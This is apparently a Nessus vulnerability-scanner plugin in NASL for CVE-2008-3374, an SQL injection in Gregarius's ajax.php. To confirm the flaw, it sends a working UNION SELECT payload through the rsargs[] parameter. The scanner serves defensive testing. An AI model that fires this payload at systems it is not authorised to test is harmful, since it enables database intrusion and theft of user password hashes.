#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33761);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2008-3374");
  script_bugtraq_id(30423);
  script_osvdb_id(47182);
  script_xref(name:"Secunia", value:"31260");

  script_name(english:"Gregarius ajax.php rsargs[] Parameter Array SQL Injection");
  script_summary(english:"Tries to manipulate feed content");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Gregarius, a web-based RSS / RDF / ATOM
feed aggregator written in PHP. 

The version of Gregarius installed on the remote host fails to
sanitize user-supplied input to the 'rsargs' parameter array of the
'ajax.php' script before using it in a database query.  An
unauthenticated attacker may be able to exploit this issue to
manipulate database queries to disclose sensitive information such as
the 'users' table with password hashes, attack the underlying
database, etc." );
  # http://web.archive.org/web/20100214110826/http://www.gulftech.org/?node=research&article_id=00119-07302008
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?3626c1b7" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/494866/30/0/threaded" );
  # http://web.archive.org/web/20100727141831/http://svn.gregarius.net/trac/ticket/510
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b82462e0" );
  # http://web.archive.org/web/20080914053904/http://wiki.gregarius.net/index.php/Changelog
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?81a85b6d" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Gregarius 0.6.0 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/07/29");
 script_cvs_date("$Date: 2016/05/16 14:02:51 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:gregarius:gregarius");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

magic1 = rand();
magic2 = rand();

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/gregarius", "/feeds", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  exploit = string("-99 UNION SELECT ", magic1, ",2,", magic2, ",4,5,6,7,8,9,0,1,2,3 --");

  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/ajax.php?",
      "rs=__exp__getFeedContent&",
      "rsargs[]=", urlencode(str:exploit)
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if we could manipulate the feed content.
  if (
    "/feed.php?y=" >< res && 
    string(magic1, "</a></h4>") >< res &&
    string("/feed.php?channel=", magic2, "&amp;") >< res
  )
  {
    security_hole(port);
    exit(0);
  }
}
